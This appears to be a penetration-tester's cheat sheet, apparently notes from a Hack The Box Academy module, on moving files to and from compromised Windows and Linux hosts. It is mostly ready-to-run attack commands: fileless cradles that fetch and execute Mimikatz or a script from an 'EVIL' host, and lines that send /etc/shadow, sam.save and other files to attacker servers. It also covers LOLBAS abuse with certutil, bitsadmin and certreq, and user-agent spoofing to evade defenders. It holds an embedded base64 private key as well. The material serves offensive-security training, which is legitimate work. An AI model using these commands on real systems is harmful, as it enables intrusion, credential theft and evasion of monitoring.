# Transferring Files

## Windows Download

### PowerShell

**Base64 Encode & Decode**

```powershell
# Attacker Machine
md5sum id_rsa
cat id_rsa |base64 -w 0;echo

# Victim
[IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFsd0FBQUFkemMyZ3RjbgpOaEFBQUFBd0VBQVFBQUFJRUF6WjE0dzV1NU9laHR5SUJQSkg3Tm9Yai84YXNHRUcxcHpJbmtiN2hIMldRVGpMQWRYZE9kCno3YjJtd0tiSW56VmtTM1BUR3ZseGhDVkRRUmpBYzloQ3k1Q0duWnlLM3U2TjQ3RFhURFY0YUtkcXl0UTFUQXZZUHQwWm8KVWh2bEo5YUgxclgzVHUxM2FRWUNQTVdMc2JOV2tLWFJzSk11dTJONkJoRHVmQThhc0FBQUlRRGJXa3p3MjFwTThBQUFBSApjM05vTFhKellRQUFBSUVBeloxNHc1dTVPZWh0eUlCUEpIN05vWGovOGFzR0VHMXB6SW5rYjdoSDJXUVRqTEFkWGRPZHo3CmIybXdLYkluelZrUzNQVEd2bHhoQ1ZEUVJqQWM5aEN5NUNHblp5SzN1Nk40N0RYVERWNGFLZHF5dFExVEF2WVB0MFpvVWgKdmxKOWFIMXJYM1R1MTNhUVlDUE1XTHNiTldrS1hSc0pNdXUyTjZCaER1ZkE4YXNBQUFBREFRQUJBQUFBZ0NjQ28zRHBVSwpFdCtmWTZjY21JelZhL2NEL1hwTlRsRFZlaktkWVFib0ZPUFc5SjBxaUVoOEpyQWlxeXVlQTNNd1hTWFN3d3BHMkpvOTNPCllVSnNxQXB4NlBxbFF6K3hKNjZEdzl5RWF1RTA5OXpodEtpK0pvMkttVzJzVENkbm92Y3BiK3Q3S2lPcHlwYndFZ0dJWVkKZW9VT2hENVJyY2s5Q3J2TlFBem9BeEFBQUFRUUNGKzBtTXJraklXL09lc3lJRC9JQzJNRGNuNTI0S2NORUZ0NUk5b0ZJMApDcmdYNmNoSlNiVWJsVXFqVEx4NmIyblNmSlVWS3pUMXRCVk1tWEZ4Vit0K0FBQUFRUURzbGZwMnJzVTdtaVMyQnhXWjBNCjY2OEhxblp1SWc3WjVLUnFrK1hqWkdqbHVJMkxjalRKZEd4Z0VBanhuZEJqa0F0MExlOFphbUt5blV2aGU3ekkzL0FBQUEKUVFEZWZPSVFNZnQ0R1NtaERreWJtbG1IQXRkMUdYVitOQTRGNXQ0UExZYzZOYWRIc0JTWDJWN0liaFA1cS9yVm5tVHJRZApaUkVJTW84NzRMUkJrY0FqUlZBQUFBRkhCc1lXbHVkR1Y0ZEVCamVXSmxjbk53WVdObEFRSURCQVVHCi0tLS0tRU5EIE9QRU5TU0ggUFJJVkFURSBLRVktLS0tLQo="))
Get-FileHash C:\Users\Public\id_rsa -Algorithm md5
```

**Web Downloads**

```powershell
powershell wget 10.10.14.4/nc.exe
```

```powershell
# Example: (New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>')
(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1','C:\Users\Public\Downloads\PowerView.ps1')

# Example: (New-Object Net.WebClient).DownloadFileAsync('<Target File URL>','<Output File Name>')
(New-Object Net.WebClient).DownloadFileAsync('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1', 'PowerViewAsync.ps1')

Invoke-RestMethod http://10.10.10.32/nc.exe -OutFile "C:\Users\Public\nc.exe"
```

Fileless attacks work by using some operating system functions to download the payload and execute it directly

```powershell
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')

(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1') | IEX

IEX (iwr 'http://EVIL/evil.ps1')
```

From PowerShell 3.0 onwards, the [Invoke-WebRequest](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-webrequest?view=powershell-7.2) cmdlet is also available, but it is noticeably slower at downloading files. You can use the aliases `iwr`, `curl`, and `wget` instead of the `Invoke-WebRequest` full name

```powershell
Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1

Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | IEX
```

Harmj0y has compiled an extensive list of PowerShell download cradles [here](https://gist.github.com/HarmJ0y/bb48307ffa663256e239). It is worth gaining familiarity with them and their nuances, such as a lack of proxy awareness or touching disk (downloading a file onto the target) to select the appropriate one for the situation.

An error in PowerShell downloads is related to the SSL/TLS secure channel if the certificate is not trusted. We can bypass that error with the following command:

```powershell
PS C:\htb> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')

Exception calling "DownloadString" with "1" argument(s): "The underlying connection was closed: Could not establish trust
relationship for the SSL/TLS secure channel."
At line:1 char:1
+ IEX(New-Object Net.WebClient).DownloadString('https://raw.githubuserc ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
    + FullyQualifiedErrorId : WebException
PS C:\htb> [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
```

### SMB

```shell
sudo impacket-smbserver share -smb2support /tmp/smbshare
copy \\192.168.220.133\share\nc.exe

sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test

# Mount the SMB Server with Username and Password
net use n: \\192.168.220.133\share /user:test test
```

### FTP

```shell
sudo pip3 install pyftpdlib
sudo python3 -m pyftpdlib --port 21
(New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'ftp-file.txt')
```

**Create a Command File for the FTP Client and Download the Target File**

```powershell
C:\htb> echo open 192.168.49.128 > ftpcommand.txt
C:\htb> echo USER anonymous >> ftpcommand.txt
C:\htb> echo binary >> ftpcommand.txt
C:\htb> echo GET file.txt >> ftpcommand.txt
C:\htb> echo bye >> ftpcommand.txt
C:\htb> ftp -v -n -s:ftpcommand.txt
ftp> open 192.168.49.128
Log in with USER and PASS first.
ftp> USER anonymous

ftp> GET file.txt
ftp> bye

C:\htb>more file.txt
This is a test file
```

## Windows Upload

### PowerShell

**PowerShell Base64 Encode & Decode**

```powershell
# Encode File Using PowerShell
[Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))

Get-FileHash "C:\Windows\system32\drivers\etc\hosts" -Algorithm MD5 | select Hash

# Decode Base64 String in Linux
echo <base64> | base64 -d > hosts
md5sum hosts 
```

**PowerShell Web Uploads**

```powershell
pip3 install uploadserver
python3 -m uploadserver

# PowerShell Script to Upload a File to Python Upload Server
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Windows\System32\drivers\etc\hosts

[+] File Uploaded:  C:\Windows\System32\drivers\etc\hosts
[+] FileHash:  5E7241D66FD77E9E8EA866B6278B2373
```

**PowerShell Base64 Web Upload**

```powershell
# Victim
$b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64

# Attacker
nc -lvnp 8000
echo <base64> | base64 -d -w 0 > hosts
```

### SMB

```powershell
sudo impacket-smbserver.py -smb2support Share

move sam.save \\10.10.15.16\Share
```

Commonly enterprises don't allow the SMB protocol (TCP/445) out of their internal network because this can open them up to potential attacks.

An alternative is to run SMB over HTTP with `WebDav`. `WebDAV` [(RFC 4918)](https://datatracker.ietf.org/doc/html/rfc4918) is an extension of HTTP. The `WebDAV` protocol enables a webserver to behave like a fileserver, supporting collaborative content authoring. `WebDAV` can also use HTTPS.

When you use `SMB`, it will first attempt to connect using the SMB protocol, and if there's no SMB share available, it will try to connect using HTTP

```shell
sudo pip install wsgidav cheroot
sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous 

# Connecting to the Webdav Share
C:\htb> dir \\192.168.49.128\DavWWWRoot
```

> **Note:** `DavWWWRoot` is a special keyword recognized by the Windows Shell. No such folder exists on your WebDAV server. The DavWWWRoot keyword tells the Mini-Redirector driver, which handles WebDAV requests that you are connecting to the root of the WebDAV server. You can avoid using this keyword if you specify a folder that exists on your server when connecting to the server. For example: `\192.168.49.128\sharefolder`

```powershell
# Downloading Files using SMB
C:\htb> copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\DavWWWRoot\
C:\htb> copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\sharefolder\
```

> **Note:** If there are no SMB (TCP/445) restrictions, you can use `impacket-smbserver` the same way we set it up for download operations.

### FTP

```shell
sudo python3 -m pyftpdlib --port 21 --write

PS C:\htb> (New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')
```

```powershell
C:\htb> echo open 192.168.49.128 > ftpcommand.txt
C:\htb> echo USER anonymous >> ftpcommand.txt
C:\htb> echo binary >> ftpcommand.txt
C:\htb> echo PUT c:\windows\system32\drivers\etc\hosts >> ftpcommand.txt
C:\htb> echo bye >> ftpcommand.txt
C:\htb> ftp -v -n -s:ftpcommand.txt
ftp> open 192.168.49.128

Log in with USER and PASS first.


ftp> USER anonymous
ftp> PUT c:\windows\system32\drivers\etc\hosts
ftp> bye
```

## Linux Download

### Base64 Encoding / Decoding

```shell
cat id_rsa |base64 -w 0;echo

echo -n '<base64>' | base64 -d > id_rsa
```

### Web Downloads with Wget and cURL

```shell
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh

curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
```

### Fileless Attacks Using Linux

Because of the way Linux works and how [pipes operate](https://www.geeksforgeeks.org/piping-in-unix-or-linux/), most of the tools we use in Linux can be used to replicate fileless operations, which means that we don't have to download a file to execute it.

> **Note:** Some payloads such as `mkfifo` write files to disk. Keep in mind that while the execution of the payload may be fileless when you use a pipe, depending on the payload chosen it may create temporary files on the OS.

```shell
curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash

wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3
```

### Download with Bash (/dev/tcp)

There may also be situations where none of the well-known file transfer tools are available. As long as Bash version 2.04 or greater is installed (compiled with --enable-net-redirections), the built-in /dev/TCP device file can be used for simple file downloads.

**Connect to the Target Webserver**

```shell
exec 3<>/dev/tcp/10.10.10.32/80
```

**HTTP GET Request**

```shell
echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3
```

**Print the Response**

```shell
cat <&3
```

### SSH

```shell
sudo systemctl enable ssh
sudo systemctl start ssh

# Now we can begin transferring files. We need to specify the IP address of our Kali and the username and password.
scp plaintext@192.168.49.128:/root/myroot.txt .
```

> **Note:** You can create a temporary user account for file transfers and avoid using your primary credentials or keys on a remote computer.

## Linux Upload

### Web Upload

**Uploadserver**

```bash
python3 -m pip install --user uploadserver
# Now we need to create a certificate. In this example, we are using a self-signed certificate.
openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
#The webserver should not host the certificate. We recommend creating a new directory to host the file for our webserver.
mkdir https && cd https

python3 -m uploadserver 443 --server-certificate /root/server.pem

# upload multiple files
# Example: From our compromised machine, let's upload the `/etc/passwd` and `/etc/shadow` files.
curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
```

**Web Server with Python3**

```shell-session
python3 -m http.server
```

**Web Server with Python2.7**

```shell
python2.7 -m SimpleHTTPServer
```

**Web Server with PHP**

```shell
php -S 0.0.0.0:8000
```

**Web Server with Ruby**

```shell-session
ruby -run -ehttpd . -p8000
```

**Download the File from the Target Machine onto Kali**

```shell
wget 192.168.49.128:8000/filetotransfer.txt
```

### SCP

```shell
scp /etc/passwd plaintext@192.168.49.128:/home/plaintext/
```

## Downloading files with code

### Python

**Python 2**

```shell
python2.7 -c 'import urllib;urllib.urlretrieve ("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
```

**Python 3**

```bash
python3 -c 'import urllib.request;urllib.request.urlretrieve("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
```

### PHP

**PHP Download with File\_get\_contents()**

```shell
php -r '$file = file_get_contents("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'
```

An alternative to `file_get_contents()` and `file_put_contents()` is the [fpopen() module](https://www.php.net/manual/en/function.fopen.php). We can use this module to open a URL, read it's content and save it into a file.

**PHP Download with Fopen()**

```shell
php -r 'const BUFFER = 1024; $fremote = 
fopen("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "rb"); $flocal = fopen("LinEnum.sh", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'
```

We can also send the downloaded content to a pipe instead, similar to the fileless method using cURL and wget.

**PHP Download a File and Pipe it to Bash**

```shell
php -r '$lines = @file("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); foreach ($lines as $line_num => $line) { echo $line; }' | bash
```

> **Note:** The URL can be used as a filename with the @file function if the fopen wrappers have been enabled.

### Ruby

```shell
ruby -e 'require "net/http"; File.write("LinEnum.sh", Net::HTTP.get(URI.parse("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh")))'
```

### Perl

```shell
perl -e 'use LWP::Simple; getstore("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh");'
```

### JavaScript

The following JavaScript code is based on [this](https://superuser.com/questions/25538/how-to-download-files-from-command-line-in-windows-like-wget-or-curl/373068) post, and we can download a file using it. We'll create a file called `wget.js` and save the following content:

```javascript
var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);
WinHttpReq.Send();
BinStream = new ActiveXObject("ADODB.Stream");
BinStream.Type = 1;
BinStream.Open();
BinStream.Write(WinHttpReq.ResponseBody);
BinStream.SaveToFile(WScript.Arguments(1));
```

We can use the following command from a Windows command prompt or PowerShell terminal to execute our JavaScript code and download a file.

**Download a File Using JavaScript and cscript.exe**

```cmd
C:\htb> cscript.exe /nologo wget.js https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView.ps1
```

### VBScript

[VBScript](https://en.wikipedia.org/wiki/VBScript) ("Microsoft Visual Basic Scripting Edition") is an Active Scripting language developed by Microsoft that is modeled on Visual Basic. VBScript has been installed by default in every desktop release of Microsoft Windows since Windows 98.

The following VBScript example can be used based on [this](https://stackoverflow.com/questions/2973136/download-a-file-with-vbs). We'll create a file called `wget.vbs` and save the following content:

```vbscript
dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", WScript.Arguments.Item(0), False
xHttp.Send

with bStrm
    .type = 1
    .open
    .write xHttp.responseBody
    .savetofile WScript.Arguments.Item(1), 2
end with
```

We can use the following command from a Windows command prompt or PowerShell terminal to execute our VBScript code and download a file.

**Download a File Using VBScript and cscript.exe**

```cmd-session
C:\htb> cscript.exe /nologo wget.vbs https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView2.ps1
```

## Uploading Files with Code

### Upload Operations using Python3

If we want to upload a file, we need to understand the functions in a particular programming language to perform the upload operation. The Python3 [requests module](https://pypi.org/project/requests/) allows you to send HTTP requests (GET, POST, PUT, etc.) using Python. We can use the following code if we want to upload a file to our Python3 [uploadserver](https://github.com/Densaugeo/uploadserver).

**Starting the Python uploadserver Module**

```shell-session
lojique@htb[/htb]$ python3 -m uploadserver 

File upload available at /upload
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

**Uploading a File Using a Python One-liner**

```shell
python3 -c 'import requests;requests.post("http://192.168.49.128:8000/upload",files={"files":open("/etc/passwd","rb")})'
```

Let's divide this one-liner into multiple lines to understand each piece better.

```python
# To use the requests function, we need to import the module first.
import requests 

# Define the target URL where we will upload the file.
URL = "http://192.168.49.128:8000/upload"

# Define the file we want to read, open it and save it in a variable.
file = open("/etc/passwd","rb")

# Use a requests POST request to upload the file. 
r = requests.post(url,files={"files":file})
```

We can do the same with any other programming language. A good practice is picking one and trying to build an upload program.

## Miscellaneous File Transfer Methods

### File Transfer with Netcat and Ncat

https://academy.hackthebox.com/module/24/section/161

```shell
victim@target:~$ nc -l -p 8000 > SharpKatz.exe

# If the compromised machine is using Ncat, we'll need to specify `--recv-only` to close the connection once the file transfer is finished.
victim@target:~$ ncat -l -p 8000 --recv-only > SharpKatz.exe
```

**Sending File to Compromised machine**

**Netcat**

```shell
lojique@htb[/htb]$ wget -q https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe

# The option `-q 0` will tell Netcat to close the connection once it finishes.
lojique@htb[/htb]$ nc -q 0 192.168.49.128 8000 < SharpKatz.exe
```

**Ncat**

```shell
lojique@htb[/htb]$ wget -q https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe
lojique@htb[/htb]$ ncat --send-only 192.168.49.128 8000 < SharpKatz.exe
```

Instead of listening on our compromised machine, we can connect to a port on our attack host to perform the file transfer operation. This method is useful in scenarios where there's a firewall blocking inbound connections.

**Compromised Machine Connect to Netcat to Receive the File**

**Netcat**

```shell
lojique@htb[/htb]$ sudo nc -l -p 443 -q 0 < SharpKatz.exe

victim@target:~$ # Example using Original Netcat
victim@target:~$ nc 192.168.49.128 443 > SharpKatz.exe
```

**Ncat**

```shell
lojique@htb[/htb]$ # Example using Ncat
lojique@htb[/htb]$ sudo ncat -l -p 443 --send-only < SharpKatz.exe

victim@target:~$ # Example using Ncat
victim@target:~$ ncat 192.168.49.128 443 --recv-only > SharpKatz.exe
```

**Compromised Machine Connecting to Netcat Using /dev/tcp to Receive the File**

If we don't have Netcat or Ncat on our compromised machine, Bash supports read/write operations on a pseudo-device file [/dev/TCP/](https://tldp.org/LDP/abs/html/devref1.html).

Writing to this particular file makes Bash open a TCP connection to `host:port`, and this feature may be used for file transfers.

**NetCat**

```shell
lojique@htb[/htb]$ sudo nc -l -p 443 -q 0 < SharpKatz.exe
```

**Ncat**

```shell
lojique@htb[/htb]$ sudo ncat -l -p 443 --send-only < SharpKatz.exe
```

```shell
# Compromised Machine Connecting to Netcat Using /dev/tcp to Receive the File
victim@target:~$ cat < /dev/tcp/192.168.49.128/443 > SharpKatz.exe
```

### PowerShell Session File Transfer

There may be scenarios where HTTP, HTTPS, or SMB are unavailable. If that's the case, we can use [PowerShell Remoting](https://docs.microsoft.com/en-us/powershell/scripting/learn/remoting/running-remote-commands?view=powershell-7.2), aka WinRM, to perform file transfer operations. [PowerShell Remoting](https://docs.microsoft.com/en-us/powershell/scripting/learn/remoting/running-remote-commands?view=powershell-7.2) allows us to execute scripts or commands on a remote computer using PowerShell sessions. By default, enabling PowerShell remoting creates both an HTTP and an HTTPS listener. The listeners run on default ports TCP/5985 for HTTP and TCP/5986 for HTTPS.

To create a PowerShell Remoting session on a remote computer, we will need administrative access, be a member of the `Remote Management Users` group, or have explicit permissions for PowerShell Remoting in the session configuration.

```powershell
# confirm we can connect to WinRM
Test-NetConnection -ComputerName DATABASE01 -Port 5985

# create PS remote session
$Session = New-PSSession -ComputerName DATABASE01

# Copy samplefile.txt from our Localhost to the DATABASE01 Session
Copy-Item -Path C:\samplefile.txt -ToSession $Session -Destination C:\Users\Administrator\Desktop\

# Copy DATABASE.txt from DATABASE01 Session to our Localhost
Copy-Item -Path "C:\Users\Administrator\Desktop\DATABASE.txt" -Destination C:\ -FromSession $Session
```

### RDP

If we are connected from Linux, we can use `xfreerdp` or `rdesktop`. `xfreerdp` and `rdesktop` allow copy from our target machine to the RDP session, but there may be scenarios where this may not work as expected.

As an alternative to copy and paste, we can mount a local resource on the target RDP server. `rdesktop` or `xfreerdp` can be used to expose a local folder in the remote RDP session.

**Mounting a Linux Folder Using rdesktop**

```shell
rdesktop 10.10.10.132 -d HTB -u administrator -p 'Password0@' -r disk:linux='/home/user/rdesktop/files'
```

**Mounting a Linux Folder Using xfreerdp**

```shell
xfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:'Password0@' /drive:linux,/home/plaintext/htb/academy/filetransfer
```

To access the directory, we can connect to `\\tsclient\`, allowing us to transfer files to and from the RDP session. !\[\[tsclient 1.jpg|500]]

Alternatively, from Windows, the native [mstsc.exe](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/mstsc) remote desktop client can be used. !\[\[rdp.png|500]]

After selecting the drive, we can interact with it in the remote session as follows:

> **Note:** This drive is not accessible to any other users logged on to the target computer, even if they manage to hijack the RDP session.

## Protected File Transfers

### File Encryption on Windows

Many different methods can be used to encrypt files and information on Windows systems. One of the simplest methods is the [Invoke-AESEncryption.ps1](https://www.powershellgallery.com/packages/DRTools/4.0.2.3/Content/Functions/Invoke-AESEncryption.ps1) PowerShell script. This script is small and provides encryption of files and strings.

**Invoke-AESEncryption.ps1**

```powershell
Import-Module .\Invoke-AESEncryption.ps1
Invoke-AESEncryption.ps1 -Mode Encrypt -Key "p4ssw0rd" -Path .\scan-results.txt
```

### File Encryption on Linux

**OpenSSL**

```shell
# Encrypting /etc/passwd with openssl
openssl enc -aes256 -iter 100000 -pbkdf2 -in /etc/passwd -out passwd.enc

# Decrypt passwd.enc with openssl
openssl enc -d -aes256 -iter 100000 -pbkdf2 -in passwd.enc -out passwd  
```

## Catching Files over HTTP/S

Web transfer is the most common way most people transfer files because `HTTP`/`HTTPS` are the most common protocols allowed through firewalls. Another immense benefit is that, in many cases, the file will be encrypted in transit. There is nothing worse than being on a Penetration Test, and a client's network IDS picks up on a sensitive file being transferred over plaintext and having them ask why we sent a password to our cloud server without using encryption.

We can either use the Python3 [uploadserver module](https://github.com/Densaugeo/uploadserver) to set up a web server with upload capabilities, but we can also use Apache or Nginx.

A good alternative for transferring files to `Apache` is [Nginx](https://www.nginx.com/resources/wiki/) because the configuration is less complicated, and the module system does not lead to security issues as `Apache` can.

```shell
sudo mkdir -p /var/www/uploads/SecretUploadDirectory
sudo chown -R www-data:www-data /var/www/uploads/SecretUploadDirectory
```

**Create Nginx Configuration File**

Create the Nginx configuration file by creating the file `/etc/nginx/sites-available/upload.conf` with the contents:

```shell
server {
    listen 9001;
    
    location /SecretUploadDirectory/ {
        root    /var/www/uploads;
        dav_methods PUT;
    }
}
```

```shell
# Symlink our Site to the sites-enabled Directory
sudo ln -s /etc/nginx/sites-available/upload.conf /etc/nginx/sites-enabled/

# start nginx
sudo systemctl restart nginx.service
```

If we get any error messages, check `/var/log/nginx/error.log`

```shell
tail -2 `/var/log/nginx/error.log`

ss -lnpt | grep `80`
ps -ef | grep `<pidNumber>`

sudo rm /etc/nginx/sites-enabled/default
```

## Living off The Land

* [LOLBAS Project for Windows Binaries](https://lolbas-project.github.io)
* [GTFOBins for Linux Binaries](https://gtfobins.github.io/)

Living off the Land binaries can be used to perform functions such as:

* Download
* Upload
* Command Execution
* File Read
* File Write
* Bypasses

#### LOLBAS

To search for download and upload functions in [LOLBAS](https://lolbas-project.github.io/) we can use `/download` or `/upload`.

**Certreq.exe**

```bash
# Upload win.ini to our Pwnbox
certreq.exe -Post -config http://192.168.49.128/ c:\windows\win.ini

# File Received in our Netcat Session
sudo nc -lnvp 80
```

If you get an error when running `certreq.exe`, the version you are using may not contain the `-Post` parameter. You can download an updated version [here](https://github.com/juliourena/plaintext/raw/master/hackthebox/certreq.exe) and try again.

**Bitsadmin**

The [Background Intelligent Transfer Service (BITS)](https://docs.microsoft.com/en-us/windows/win32/bits/background-intelligent-transfer-service-portal) can be used to download files from HTTP sites and SMB shares

```powershell
# File Download
bitsadmin /transfer n http://10.10.10.32/nc.exe C:\Temp\nc.exe
Import-Module bitstransfer; Start-BitsTransfer -Source "http://10.10.10.32/nc.exe" -Destination "C:\Temp\nc.exe"

# upload
Start-BitsTransfer "C:\Temp\bloodhound.zip" -Destination "http://10.10.10.132/uploads/bloodhound.zip" -TransferType Upload -ProxyUsage Override -ProxyList PROXY01:8080 -ProxyCredential INLANEFREIGHT\svc-sq
```

**Certutil**

Certutil can be used to download arbitrary files. It is available in all Windows versions and has been a popular file transfer technique, serving as a defacto `wget` for Windows. However, the Antimalware Scan Interface (AMSI) currently detects this as malicious Certutil usage.

```bash
# Download a file
certutil -urlcache -split -f http://10.10.10.32/nc.exe 
certutil.exe -verifyctl -split -f http://10.10.10.32/nc.exe
```

#### GTFOBins

To search for the download and upload function in [GTFOBins for Linux Binaries](https://gtfobins.github.io/), we can use `+file download` or `+file upload`.

**OpenSSL**

Let's use [OpenSSL](https://www.openssl.org/). It's frequently installed and often included in other software distributions, with sysadmins using it to generate security certificates, among other tasks. OpenSSL can be used to send files "nc style."

We need to create a certificate and start a server on Kali

```shell
# Create Certificate
openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem

# Stand up the Server in our Pwnbox
openssl s_server -quiet -accept 80 -cert certificate.pem -key key.pem < /tmp/LinEnum.sh

# Next, with the server running, we need to download the file from the compromised machine.
openssl s_client -connect 10.10.10.32:80 -quiet > LinEnum.sh
```

## Evading Detection

### Changing User Agent

If diligent administrators or defenders have blacklisted any of these User Agents, [Invoke-WebRequest](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-webrequest?view=powershell-7.1) contains a UserAgent parameter, which allows for changing the default user agent to one emulating Internet Explorer, Firefox, Chrome, Opera, or Safari. For example, if Chrome is used internally, setting this User Agent may make the request seem legitimate.

**Listing out User Agents**

```powershell
[Microsoft.PowerShell.Commands.PSUserAgent].GetProperties() | Select-Object Name,@{label="User Agent";Expression={[Microsoft.PowerShell.Commands.PSUserAgent]::$($_.Name)}} | fl

Name       : InternetExplorer
User Agent : Mozilla/5.0 (compatible; MSIE 9.0; Windows NT; Windows NT 10.0; en-US)

Name       : FireFox
User Agent : Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) Gecko/20100401 Firefox/4.0

Name       : Chrome
User Agent : Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) AppleWebKit/534.6 (KHTML, like Gecko) Chrome/7.0.500.0
             Safari/534.6

Name       : Opera
User Agent : Opera/9.70 (Windows NT; Windows NT 10.0; en-US) Presto/2.2.1

Name       : Safari
User Agent : Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) AppleWebKit/533.16 (KHTML, like Gecko) Version/5.0
             Safari/533.16
```

**Request with Chrome User Agent**

```powershell
Invoke-WebRequest http://10.10.10.32/nc.exe -UserAgent [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome -OutFile "C:\Users\Public\nc.exe"

nc -lvnp 80
```

### LOLBAS / GTFOBins

Application whitelisting may prevent you from using PowerShell or Netcat, and command-line logging may alert defenders to your presence. In this case, an option may be to use a "LOLBIN" (living off the land binary), alternatively also known as "misplaced trust binaries." An example LOLBIN is the Intel Graphics Driver for Windows 10 (GfxDownloadWrapper.exe), installed on some systems and contains functionality to download configuration files periodically. This download functionality can be invoked as follows:

```powershell
 GfxDownloadWrapper.exe "http://10.10.10.132/mimikatz.exe" "C:\Temp\nc.exe"
```
